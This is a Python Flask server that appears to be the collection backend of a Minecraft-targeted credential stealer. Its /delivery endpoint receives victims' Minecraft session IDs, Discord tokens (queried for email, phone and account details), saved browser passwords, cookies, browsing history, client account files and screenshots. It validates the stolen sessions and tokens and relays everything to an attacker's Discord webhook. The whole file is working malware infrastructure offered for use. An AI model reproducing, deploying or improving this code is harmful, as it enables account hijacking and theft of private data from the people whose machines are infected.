import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)

def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Bearer " + ssid
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        profile = r.json()
        return profile['name'] == ign and profile['id'] == uuid
    return False

def split_embed(embed, max_length=6000):
    fields = embed.fields
    split_embeds = []
    current_embed = DiscordEmbed(title=embed.title, color=embed.color)
    current_length = len(embed.title or "") + len(embed.description or "")

    for field in fields:
        field_length = len(field.name) + len(field.value)
        if current_length + field_length > max_length:
            split_embeds.append(current_embed)
            current_embed = DiscordEmbed(title=embed.title, color=embed.color)
            current_length = len(embed.title or "") + len(embed.description or "")

        current_embed.add_embed_field(name=field.name, value=field.value, inline=field.inline)
        current_length += field_length

    split_embeds.append(current_embed)
    return split_embeds

class Delivery(Resource):
    def post(self):
        args = request.json

        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ['REMOTE_ADDR'])

        if ip in ips:
            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 60:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = time.time()
            elif ips[ip]['count'] < config['ip_ratelimit']:
                ips[ip]['count'] += 1
            else:
                return {'status': 'ratelimited'}, 429
        else:
            ips[ip] = {'count': 1, 'timestamp': time.time()}

        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
                                 username=config['webhook_name'],
                                 avatar_url=config['webhook_avatar'])

        cb = '`' if config['codeblock_type'] == 'small' else '```'

        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session']:
            if not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
                return {'status': 'invalid session'}, 401

        mc_embed = DiscordEmbed(title=config['mc_embed_title'], color=int(config['mc_embed_color'], 16))
        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        mc_embed.add_embed_field(name="IGN", value=f"{cb}{mc['ign']}{cb}", inline=True)
        mc_embed.add_embed_field(name="UUID", value=f"{cb}{mc['uuid']}{cb}", inline=True)
        mc_embed.add_embed_field(name="Session ID", value=f"{cb}{mc['ssid']}{cb}", inline=True)
        webhook.add_embed(mc_embed)

        if args.get('discord'):
            for tokenjson in args['discord']:
                token = tokenjson['token']
                headers = {"Authorization": token}
                tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

                if tokeninfo.status_code == 200:
                    discord_embed = DiscordEmbed(title=config['discord_embed_title'], color=int(config['discord_embed_color'], 16))
                    discord_embed.set_footer(text=config['discord_embed_footer_text'], icon_url=config['discord_embed_footer_icon'])
                    discord_embed.add_embed_field(name="Username", value=f"{cb}{tokeninfo.json()['username']}#{tokeninfo.json()['discriminator']}{cb}", inline=True)
                    discord_embed.add_embed_field(name="ID", value=f"{cb}{tokeninfo.json()['id']}{cb}", inline=True)
                    discord_embed.add_embed_field(name="Token", value=f"{cb}{token}{cb}", inline=True)
                    discord_embed.add_embed_field(name="Email", value=f"{cb}{tokeninfo.json()['email']}{cb}", inline=True)
                    discord_embed.add_embed_field(name="Phone", value=f"{cb}{tokeninfo.json()['phone'] or 'Not linked'}{cb}", inline=True)
                    discord_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{tokeninfo.json()['id']}/{tokeninfo.json()['avatar']}.png")
                    discord_embed.add_embed_field(name="Nitro", value=f"{cb}{'Yes' if tokeninfo.json()['premium_type'] != 0 else 'No'}{cb}", inline=True)
                    webhook.add_embed(discord_embed)
                else:
                    return {'status': 'invalid token'}, 401

        password_list = [password for password in args['passwords'] if password['password']]
        if password_list:
            descriptions = [""]
            i = 0
            for j, password in enumerate(password_list):
                description = f"URL: {password['url']}\nUsername: {cb}{password['username']}{cb}\nPassword: {cb}{password['password']}{cb}"
                if len(descriptions[i]) + len(description) > 3500 and j != len(password_list) - 1:
                    i += 1
                    descriptions.append(description)
                else:
                    descriptions[i] += description

            for description in descriptions:
                password_embed = DiscordEmbed(title=config['password_embed_title'], color=int(config['password_embed_color'], 16), description=description)
                password_embed.set_footer(text=config['password_embed_footer_text'], icon_url=config['password_embed_footer_icon'])
                webhook.add_embed(password_embed)

        else:
            password_embed = DiscordEmbed(title=config['password_embed_title'], color=int(config['password_embed_color'], 16), description="No passwords found")
            password_embed.set_footer(text=config['password_embed_footer_text'], icon_url=config['password_embed_footer_icon'])
            webhook.add_embed(password_embed)

        file_embed = DiscordEmbed(title=config['file_embed_title'], color=int(config['file_embed_color'], 16))
        file_embed.set_footer(text=config['file_embed_footer_text'], icon_url=config['file_embed_footer_icon'])
        file_embed.add_embed_field(name="Lunar Client File", value="Yes" if 'lunar' in args else "No")
        file_embed.add_embed_field(name="Essential File", value="Yes" if "essential" in args else "No")
        webhook.add_embed(file_embed)

        if "lunar" in args:
            webhook.add_file(file=base64.b64decode(args['lunar']), filename="lunar_accounts.json")
        if "essential" in args:
            webhook.add_file(file=base64.b64decode(args['essential']), filename="essential_accounts.json")

        webhook.add_file(file=base64.b64decode(args['history'].encode()), filename="history.txt")
        webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
        webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")

        webhook.execute()

        return {'status': 'ok'}, 200

    def get(self):
        return {'status': 'ok'}, 200

api.add_resource(Delivery, '/delivery')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
